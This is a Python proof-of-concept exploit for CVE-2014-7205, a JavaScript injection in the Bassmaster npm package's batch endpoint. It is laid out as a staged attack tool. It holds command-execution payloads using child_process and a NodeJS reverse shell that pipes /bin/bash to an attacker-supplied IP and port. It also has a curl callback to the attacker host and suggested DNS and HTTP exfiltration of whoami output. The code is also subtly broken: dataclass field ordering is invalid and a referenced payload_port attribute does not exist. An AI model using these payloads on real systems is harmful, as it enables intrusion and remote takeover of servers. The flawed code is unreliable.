#!/usr/bin/env python3
"""
Bassmaster NodeJS Arbitrary JavaScript Injection RCE PoC
CVE: CVE-2014-7205
Target: Bassmaster NPM Package <= 1.5.1
Vulnerability: Arbitrary JavaScript execution via batch request parameter injection

Reference:
- https://www.npmjs.com/package/bassmaster
- https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/bassmaster_js_injection.rb
- https://www.exploit-db.com/exploits/40689

Exploit Flow:
1. Identify Bassmaster endpoint (typically /batch)
2. Inject malicious JavaScript in batch request
3. Execute arbitrary code on server via require('child_process')
4. Establish reverse shell or execute commands
"""

import argparse
import requests
import sys
import json
import base64
from dataclasses import dataclass, field
from typing import Optional
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# EXPLOIT CONTEXT
# ============================================================================

@dataclass(slots=True)
class ExploitContext:
    """Bassmaster exploit configuration and state."""

    # Target configuration
    target_ip: str
    target_port: int
    protocol: str = "http"
    batch_endpoint: str = "/batch"

    # Attacker configuration
    attacker_ip: str
    attacker_port: int

    # Exploit configuration
    proxy: Optional[str] = None
    command: str = "id"

    # Runtime state
    session: requests.Session = field(default_factory=requests.Session, repr=False)
    rce_confirmed: bool = field(default=False, repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        """Build ExploitContext from CLI arguments."""
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            batch_endpoint=args.batch_endpoint,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            proxy=args.proxy,
            command=args.command,
        )

    def get_base_url(self) -> str:
        """Construct base URL for target."""
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_batch_url(self) -> str:
        """Construct batch endpoint URL."""
        return f"{self.get_base_url()}{self.batch_endpoint}"

    def get_proxies(self) -> Optional[dict]:
        """Return proxy configuration for requests."""
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None

# ============================================================================
# ARGUMENT PARSING
# ============================================================================

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Bassmaster NodeJS JavaScript Injection RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Simple command execution
  %(prog)s --target-ip 192.168.1.100 --target-port 8080 --command "whoami"

  # Reverse shell
  %(prog)s --target-ip 192.168.1.100 --listening-ip 10.10.14.5 --reverse-shell

  # With Burp proxy
  %(prog)s --target-ip 192.168.1.100 --proxy http://127.0.0.1:8080 --command "id"
        """
    )

    target_group = parser.add_argument_group("Target options")
    target_group.add_argument(
        "--target-ip", required=True, help="Target IP address"
    )
    target_group.add_argument(
        "--target-port", type=int, default=8080, help="Target port (default: 8080)"
    )
    target_group.add_argument(
        "--batch-endpoint", default="/batch", help="Batch endpoint path (default: /batch)"
    )

    attacker_group = parser.add_argument_group("Attacker options")
    attacker_group.add_argument(
        "--listening-ip", default="10.10.14.1", help="Attacker IP for reverse shell"
    )
    attacker_group.add_argument(
        "--listening-port", type=int, default=9001, help="Listening port (default: 9001)"
    )

    exploit_group = parser.add_argument_group("Exploit options")
    exploit_group.add_argument(
        "--command", default="id", help="Command to execute (default: id)"
    )
    exploit_group.add_argument(
        "--reverse-shell", action="store_true", help="Attempt to establish reverse shell"
    )

    optional_group = parser.add_argument_group("Optional options")
    optional_group.add_argument(
        "--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)"
    )

    return parser.parse_args()

# ============================================================================
# PAYLOAD GENERATION
# ============================================================================

def generate_js_injection_payload(command: str) -> str:
    """
    Generate JavaScript injection payload for Bassmaster.

    The vulnerability: Bassmaster evaluates user input in batch requests
    without proper sanitization, allowing arbitrary JavaScript execution.

    Vulnerable code pattern:
        eval("var batch = " + userInput);

    Exploitation:
        userInput = "{}; require('child_process').exec('id'); //"
    """
    # NodeJS child_process execution payload
    payload = f"require('child_process').exec('{command}')"

    return payload

def generate_reverse_shell_payload(ip: str, port: int) -> str:
    """Generate NodeJS reverse shell payload."""

    # NodeJS reverse shell using net module
    shell = f"""
(function(){{
    var net = require('net');
    var spawn = require('child_process').spawn;
    var sh = spawn('/bin/bash', []);
    var client = new net.Socket();
    client.connect({port}, '{ip}', function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();
""".strip().replace('\n', '')

    return shell

def craft_batch_request(payload: str) -> dict:
    """
    Craft malicious batch request.

    Bassmaster expects JSON batch requests like:
    {
        "requests": [
            {"method": "get", "path": "/"},
            {"method": "get", "path": "/user"}
        ]
    }

    We inject JavaScript in the path parameter:
    {
        "requests": [
            {"method": "get", "path": "$${PAYLOAD}"}
        ]
    }
    """

    # Injection point: path parameter with $${ } syntax
    batch_request = {
        "requests": [
            {
                "method": "get",
                "path": f"/$${{{payload}}}"
            }
        ]
    }

    return batch_request

# ============================================================================
# EXPLOIT STAGES
# ============================================================================

def stage_recon(ctx: ExploitContext) -> bool:
    """Stage 1: Verify Bassmaster endpoint exists."""
    print(f"[*] Stage 1: Reconnaissance")
    print(f"[*] Target: {ctx.get_batch_url()}")

    try:
        # Try to access batch endpoint
        response = ctx.session.post(
            ctx.get_batch_url(),
            json={"requests": []},
            headers={"Content-Type": "application/json"},
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        if response.status_code in [200, 400, 500]:
            print(f"[+] Bassmaster batch endpoint confirmed (HTTP {response.status_code})")
            return True
        else:
            print(f"[-] Batch endpoint not accessible (HTTP {response.status_code})")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Connection failed: {e}")
        return False

def stage_exploit_command(ctx: ExploitContext) -> bool:
    """Stage 2: Execute arbitrary command."""
    print(f"\n[*] Stage 2: Command Execution")
    print(f"[*] Command: {ctx.command}")

    # Generate payload
    js_payload = generate_js_injection_payload(ctx.command)
    print(f"[*] JS Payload: {js_payload}")

    # Craft batch request
    batch_data = craft_batch_request(js_payload)

    try:
        response = ctx.session.post(
            ctx.get_batch_url(),
            json=batch_data,
            headers={"Content-Type": "application/json"},
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        print(f"[*] Response Status: {response.status_code}")

        # The command executes, but output isn't directly returned
        # We need blind RCE verification or callback
        if response.status_code in [200, 400, 500]:
            print(f"[+] Payload sent successfully")
            print(f"[!] Note: This is blind RCE - use reverse shell or callback for output")
            ctx.rce_confirmed = True
            return True
        else:
            print(f"[-] Unexpected response: {response.status_code}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Exploitation failed: {e}")
        return False

def stage_reverse_shell(ctx: ExploitContext) -> bool:
    """Stage 3: Establish reverse shell."""
    print(f"\n[*] Stage 3: Reverse Shell")
    print(f"[*] Target will connect to: {ctx.attacker_ip}:{ctx.attacker_port}")
    print(f"[!] Start your listener: nc -nlvp {ctx.attacker_port}")

    # Generate reverse shell payload
    shell_payload = generate_reverse_shell_payload(ctx.attacker_ip, ctx.attacker_port)
    print(f"[*] Shell Payload: {shell_payload[:80]}...")

    # Craft batch request with shell payload
    batch_data = craft_batch_request(shell_payload)

    try:
        input(f"\n[!] Press ENTER when listener is ready...")

        print(f"[*] Sending reverse shell payload...")
        response = ctx.session.post(
            ctx.get_batch_url(),
            json=batch_data,
            headers={"Content-Type": "application/json"},
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        if response.status_code in [200, 400, 500]:
            print(f"[+] Reverse shell payload sent!")
            print(f"[+] Check your listener for incoming connection")
            return True
        else:
            print(f"[-] Unexpected response: {response.status_code}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Reverse shell failed: {e}")
        return False

def stage_verify_callback(ctx: ExploitContext) -> bool:
    """Stage 4: Verify RCE using HTTP callback."""
    print(f"\n[*] Stage 4: RCE Verification (Callback)")

    # Use curl callback to verify RCE
    callback_url = f"http://{ctx.attacker_ip}:{ctx.payload_port}/rce-verify"
    curl_command = f"curl {callback_url}"

    print(f"[*] Testing RCE with callback to: {callback_url}")
    print(f"[!] Start listener: python3 -m http.server {ctx.payload_port}")

    # Generate callback payload
    js_payload = generate_js_injection_payload(curl_command)
    batch_data = craft_batch_request(js_payload)

    try:
        response = ctx.session.post(
            ctx.get_batch_url(),
            json=batch_data,
            headers={"Content-Type": "application/json"},
            timeout=10,
            verify=False,
            proxies=ctx.get_proxies()
        )

        if response.status_code in [200, 400, 500]:
            print(f"[+] Callback payload sent")
            print(f"[+] Check your HTTP server logs for incoming GET request")
            return True
        else:
            print(f"[-] Unexpected response: {response.status_code}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Verification failed: {e}")
        return False

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main execution flow."""
    print("[+] Bassmaster NodeJS JavaScript Injection RCE PoC")
    print("[+] CVE-2014-7205")
    print("[+] " + "=" * 60)

    # Parse arguments and build context
    args = parse_args()
    ctx = ExploitContext.from_args(args)

    # Execute reconnaissance
    if not stage_recon(ctx):
        print("\n[-] Reconnaissance failed. Aborting.")
        sys.exit(1)

    # Execute exploit based on mode
    if args.reverse_shell:
        # Reverse shell mode
        stage_reverse_shell(ctx)
    else:
        # Command execution mode
        stage_exploit_command(ctx)
        stage_verify_callback(ctx)

    print("\n[+] Exploit completed!")
    print("[+] " + "=" * 60)

    # Summary
    print(f"\n[*] Summary:")
    print(f"    Target: {ctx.get_batch_url()}")
    print(f"    Mode: {'Reverse Shell' if args.reverse_shell else 'Command Execution'}")
    if not args.reverse_shell:
        print(f"    Command: {ctx.command}")

    print(f"\n[*] Alternative payloads to try:")
    print(f"    1. File write: echo 'pwned' > /tmp/proof.txt")
    print(f"    2. DNS exfil: nslookup $(whoami).{ctx.attacker_ip}")
    print(f"    3. HTTP callback: curl http://{ctx.attacker_ip}:{ctx.payload_port}/$(whoami)")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exploit interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
